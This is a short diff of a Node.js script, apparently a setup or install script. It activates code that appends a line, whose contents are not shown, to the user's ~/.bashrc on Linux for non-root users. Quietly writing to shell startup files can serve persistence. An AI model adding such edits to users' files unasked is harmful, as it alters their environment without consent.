@@ -19,7 +19,7 @@ if(Os.platform() == "darwin"){
 	}
 	
 }
-if(Os.platform() == "darwin" || Os.platform() == "linux"){
+if(Os.platform() == "darwin"){
 	file1 = Path.join(Os.homedir(), ".bashrc")
 	if (fs.existsSync(file1))
 		content = fs.readFileSync(file1, 'utf8')
@@ -44,15 +44,16 @@ if(content.indexOf(newline) < 0){
 
 if (process.getuid() != 0) {
 
-	/*
-	file = Path.join(Os.homedir(), ".bashrc")
-	content = ''
-	if (fs.existsSync(file)) {
-		content = fs.readFileSync(file, 'utf8')
+	if (Os.platform() == "linux") {
+		file = Path.join(Os.homedir(), ".bashrc")
+		content = ''
+		if (fs.existsSync(file)) {
+			content = fs.readFileSync(file, 'utf8')
+		}
+		if (content.indexOf(newline) < 0) {
+			fs.writeFileSync(file, content + newline + "\"\n")
+		}
 	}
-	if (content.indexOf(newline) < 0) {
-		fs.writeFileSync(file, content + newline + "\"\n")
-	}*/
 }
 
 process.stdout.write('c')
